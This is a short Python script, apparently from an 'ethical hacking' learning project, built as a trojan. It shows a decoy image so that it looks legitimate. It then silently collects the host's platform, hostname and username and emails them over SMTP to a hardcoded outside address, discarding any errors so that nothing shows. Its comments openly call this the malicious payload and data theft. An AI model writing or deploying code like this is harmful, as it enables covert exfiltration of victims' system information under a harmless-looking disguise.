#!/usr/bin/env python3
import os
import sys
import platform
import socket
import smtplib
import ssl
import subprocess
from PIL import Image

def display_image():
    """Display the decoy image"""
    try:
        # Embedded image data would go here in real malware
        # For now, we'll try to open the original image
        img_path = "/home/quietcod/Documents/Python-Ethical-Hacking/input.jpg"
        if os.path.exists(img_path):
            img = Image.open(img_path)
            img.show()
        else:
            print("Image not found")
    except Exception as e:
        print(f"Error displaying image: {e}")

def execute_payload():
    """Execute the malicious payload"""
    try:
        import platform
        import socket
        import os
        import smtplib
        import ssl
        import json
        from cryptography.fernet import Fernet

        def steal_data():
            system_info = {
                'platform': platform.platform(),
                'hostname': socket.gethostname(),
                'username': os.environ.get('USER')
            }
            return system_info

        def send_mail(data):
            try:
                smtp_server = 'smtp.mail.me.com'
                port = 587
                sender_email = 'gshubh03@icloud.com'
                receiver_email = 'gshubh03@icloud.com'  # Send to same email
                password = "your_app_password_here"  # In real malware, this would be hardcoded
                
                msg = str(data)
                context = ssl.create_default_context()
                with smtplib.SMTP(smtp_server, port) as server:
                    server.starttls(context=context)
                    server.login(sender_email, password)
                    server.sendmail(sender_email, receiver_email, msg)
            except Exception as e:
                pass

        data = steal_data()
        send_mail(data)
    except:
        pass

if __name__ == "__main__":
    # Display image first to appear legitimate
    display_image()
    
    # Execute payload in background
    execute_payload()
